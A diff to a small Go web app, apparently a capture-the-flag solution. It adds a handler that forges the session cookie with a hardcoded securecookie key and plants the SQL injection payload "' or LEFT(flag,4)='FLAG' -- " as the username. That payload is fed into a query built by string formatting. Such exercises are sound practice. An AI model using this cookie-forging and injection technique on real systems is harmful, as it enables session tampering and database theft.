@@ -14,6 +14,7 @@ import (
 	"time"
 
 	_ "github.com/go-sql-driver/mysql"
+	"github.com/gorilla/securecookie"
 	"github.com/gorilla/sessions"
 )
 
@@ -88,7 +89,26 @@ func main() {
 			templates.ExecuteTemplate(w, "login.html", nil)
 		}
 	})
+	http.HandleFunc("/de", func(w http.ResponseWriter, r *http.Request) {
+		var s *securecookie.SecureCookie
+		s = securecookie.New([]byte("d2908c1de1cd896d90f09df7df67e1d4"), nil)
+		value := make(map[interface{}]interface{})
+		cookie, _ := r.Cookie("session")
+		if err := s.Decode("session", cookie.Value, &value); err == nil {
+			//modify the value in some way
+			value["username"] = "' or LEFT(flag,4)='FLAG' -- "
+			//re-encode it
+			if encoded, err := s.Encode("session", value); err == nil {
+				cookie := &http.Cookie{
+					Name:  "session",
+					Value: encoded,
+					Path:  "/",
+				}
+				http.SetCookie(w, cookie)
+			}
+		}
 
+	})
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		session, _ := store.Get(r, "session")
 
@@ -99,6 +119,7 @@ func main() {
 		}
 
 		query := fmt.Sprintf("SELECT username, flag FROM users WHERE username='%s'", username)
+		log.Printf(query)
 		row := db.QueryRow(query)
 		var user User
 		row.Scan(&user.Username, &user.Flag)
